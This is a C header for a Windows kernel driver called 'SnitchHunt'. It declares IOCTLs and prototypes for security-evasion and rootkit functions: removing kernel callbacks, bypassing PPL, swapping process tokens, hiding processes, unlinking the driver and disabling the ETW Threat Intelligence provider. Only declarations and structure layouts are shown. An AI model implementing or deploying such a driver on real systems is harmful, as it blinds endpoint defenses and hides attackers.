#ifndef UTILS_H
#define UTILS_H

#include <ntifs.h>
//#include <ntddk.h>
#include <Aux_klib.h>
#include <minwindef.h>



#define DRIVER_NAME "SnitchHunt"
#define DRIVER_TAG 'cazz'

#pragma comment(lib, "Aux_klib.lib")


#define SYSTEM_DRV 0x8000
#define IOCTL_BASE 0x800

// Macro to build IOCTLs using METHOD_BUFFERED
#define CTL_CODE_HIDE(i) \
    CTL_CODE(SYSTEM_DRV, IOCTL_BASE + i, METHOD_BUFFERED, FILE_ANY_ACCESS)


#define IOCTL_KILL_PROCESS CTL_CODE_HIDE(1)
#define IOCTL_REM_PROC_CALLBACK CTL_CODE_HIDE(2)
#define IOCTL_LIST_PROC_CALLBACK CTL_CODE_HIDE(3)
#define IOCTL_LIST_THREAD_CALLBACK CTL_CODE_HIDE(4)
#define IOCTL_REM_THREAD_CALLBACK CTL_CODE_HIDE(5)
#define IOCTL_LIST_LOAD_IMAGE_CALLBACK CTL_CODE_HIDE(6)
#define IOCTL_REM_LOAD_IMAGE_CALLBACK CTL_CODE_HIDE(7)
#define IOCTL_LIST_REG_CALLBACK CTL_CODE_HIDE(8)
#define IOCTL_REM_REG_CALLBACK CTL_CODE_HIDE(9)
#define IOCTL_REM_OBJ_CALLBACK CTL_CODE_HIDE(10)
#define IOCTL_CRASH_PROCESS CTL_CODE_HIDE(11)
#define IOCTL_PPL_BYPASS CTL_CODE_HIDE(12)
#define IOCTL_PROC_TOKEN_SWAP CTL_CODE_HIDE(13)
#define IOCTL_UMPROC_HIDE CTL_CODE_HIDE(14)
#define IOCTL_UNLINK_ROOTKIT_DRV CTL_CODE_HIDE(15)
#define IOCTL_UNMAP_PROC CTL_CODE_HIDE(16)
#define IOCTL_WIN_ETW_DISABLE CTL_CODE_HIDE(17)



typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemProcessInformation = 5,
    SystemProcessorPerformanceInformation = 8,
    SystemInterruptInformation = 23,
    SystemExceptionInformation = 33,
    SystemRegistryQuotaInformation = 37,
    SystemLookasideInformation = 45,
    SystemCodeIntegrityInformation = 103,
    SystemPolicyInformation = 134,
} SYSTEM_INFORMATION_CLASS;

// Structure used for returning module name and base address
struct ModulesData {
    CHAR ModuleName[256];
    ULONG64 ModuleBase;
};

//struct ModulesDataNode {
//    ModulesData Data;
//    ModulesDataNode* Next;
//};

struct ModulesDataArray {
    ModulesData* Modules;
    SIZE_T Count;
};


typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
    ULONG Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    CHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
    ULONG NumberOfModules;
    _RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;


typedef NTSTATUS(*PFN_ZwQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength);

typedef PVOID(*PFN_PsGetProcessSectionBaseAddress)(PEPROCESS Process);
typedef NTSTATUS(*PFN_MmUnmapViewOfSection)(PEPROCESS Process, PVOID BaseAddress);

typedef enum _NOTIFY_ROUTINE_TYPE {
    ImageLoadCallback
} NOTIFY_ROUTINE_TYPE;

// Structure representing a registered object callback entry
typedef struct OB_CALLBACK_ENTRY_t {
    LIST_ENTRY CallbackList;                 // Linked into _OBJECT_TYPE.CallbackList
    OB_OPERATION Operations;                 // Types of operations (create, duplicate, etc.)
    bool Enabled;                            // Whether the callback is active
    struct OB_CALLBACK_t* Entry;             // Pointer to the main registration entry
    POBJECT_TYPE ObjectType;                 // Target object type (e.g., PsProcessType)
    POB_PRE_OPERATION_CALLBACK PreOperation; // Callback before handle creation
    POB_POST_OPERATION_CALLBACK PostOperation;// Callback after handle creation
    KSPIN_LOCK Lock;                         // Synchronization mechanism
} OB_CALLBACK_ENTRY, * POB_CALLBACK_ENTRY;

typedef struct _MODULE_ENTRY
{
    LIST_ENTRY InLoadOrderLinks;			// the load order list 
    LIST_ENTRY InMemoryOrderLinks;			// the memory order list
    LIST_ENTRY InInitializationOrderLinks;	// the initialization order list.
    PVOID ModuleBase;
    PVOID EntryPoint;
    ULONG ModuleSize;
    UNICODE_STRING FullModuleName;
    UNICODE_STRING BaseModuleName;
    ULONG ModuleFlags;
    USHORT LoadCount;
    USHORT TlsIndex;
    union
    {
        LIST_ENTRY HashLinks;
        struct
        {
            PVOID SectionPointer;
            ULONG CheckSum;
        } RandomStructname1;
    };
    union
    {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    };
    struct _ACTIVATION_CONTEXT* EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
} MODULE_ENTRY, * PMODULE_ENTRY;


typedef enum _DCMB_CALLBACK_TYPE {
    ProcessObjectCreationCallback,
    ThreadObjectCreationCallback,
} DCMB_CALLBACK_TYPE;

struct pplData {
    DWORD pid;
    DWORD offset;
};

struct elevateProcArgs {
    DWORD pid1;
    DWORD pid2;
    int offset;
};

struct hideProcArgs {
    DWORD pid;
    DWORD offset;
};

struct disKerETWArgs {
    DWORD etWThreatIntProvRegHandleOffset;
    DWORD regEntry_guidEntryOffset;
    DWORD GuidEntry_ProviderEnableInfoOffset;
};


ModulesData* EnumRegisteredDrivers(UINT64);
UINT64 FindProcNotifyRoutineAddress(UINT64, NOTIFY_ROUTINE_TYPE);
UINT64 FindThreadNotifyRoutineAddress(UINT64, NOTIFY_ROUTINE_TYPE);
UINT64 FindLoadImageNotifyRoutineAddress(UINT64, NOTIFY_ROUTINE_TYPE);
UINT64 FindRegCallbackNotifyRoutineAddress(UINT64, NOTIFY_ROUTINE_TYPE);


NTSTATUS SearchModules(ULONG64, ModulesData*);
UINT64 FindKernelBase();
NTSTATUS DeleteNotifyEntry(ULONG64, int);
NTSTATUS DeleteRegCallbackEntry(ULONG64);
NTSTATUS RemObjCallbackNotifyRoutineAddress();

NTSTATUS pplBypass(UINT64, int);
NTSTATUS procTokenSwap(DWORD, DWORD, int);

NTSTATUS TermProcess(ULONG_PTR);
NTSTATUS crashProcess(ULONG_PTR);
NTSTATUS unmapProcess(ULONG_PTR);

NTSTATUS procHiding(DWORD, DWORD);
NTSTATUS unlinkDriver(PDRIVER_OBJECT);

NTSTATUS disablingWTI(ULONG64, disKerETWArgs);

#ifndef SystemModuleInformation
#define SystemModuleInformation 0xB
#endif

#endif // !UTILS_H